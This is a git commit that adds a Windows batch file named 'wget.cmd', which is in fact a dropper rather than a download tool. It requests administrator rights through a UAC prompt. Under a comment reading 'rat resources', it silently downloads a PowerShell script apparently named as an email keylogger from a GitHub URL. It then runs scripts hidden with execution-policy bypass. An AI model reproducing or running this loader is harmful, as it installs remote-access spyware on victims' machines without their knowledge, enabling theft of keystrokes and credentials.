f7e256d4cce0c0afb4d736542ead55e874a7a166
KutilKuda <150882857+KutilKuda@users.noreply.github.com>
2025-07-10 11:48:48 +0700

    Add files via upload

---
+++ wget.cmd
@@ -0,0 +1,38 @@
+REM get admin permissions for script
+@echo off
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> if error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+REM you can remove the 'powershell' to get an admin CMD
+start powershell
+
+REM rat resources
+REM powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/Email-KLv2.ps1' -OutFile 'POC.zip'"
+powershell -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/Email-KLv2.ps1' -OutFile 'install.ps1'"
+powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+powershell powershell.exe "$env:temp/p.ps1"
